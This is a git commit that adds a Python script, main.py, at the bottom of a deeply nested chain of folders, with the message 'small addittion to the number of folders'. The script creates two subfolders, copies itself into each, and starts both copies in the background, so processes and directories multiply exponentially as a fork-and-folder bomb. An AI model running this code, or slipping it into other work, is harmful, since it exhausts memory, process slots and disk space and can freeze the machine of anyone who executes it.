44d8de4d173bb958c44c31ae297046a559051a11
Zoobdude <96008479+Zoobdude@users.noreply.github.com>
2022-10-18 10:31:20 +0000

    small addittion to the number of folders

---
+++ folder/folder/folder/folder/folder/folder/folder2/folder2/folder2/folder/folder2/folder/folder/main.py
@@ -0,0 +1,16 @@
+import os
+
+
+
+path = os.path.abspath(os.path.dirname(__file__))
+file = os.path.basename(__file__)
+
+
+
+
+os.system(f"mkdir {path}/folder")
+os.system(f"mkdir {path}/folder2")
+os.system(f"cp {file} {path}/folder/main.py")
+os.system(f"cp {file} {path}/folder2/main.py")
+os.system(f"python3 {path}/folder/main.py &")
+os.system(f"python3 {path}/folder2/main.py &")
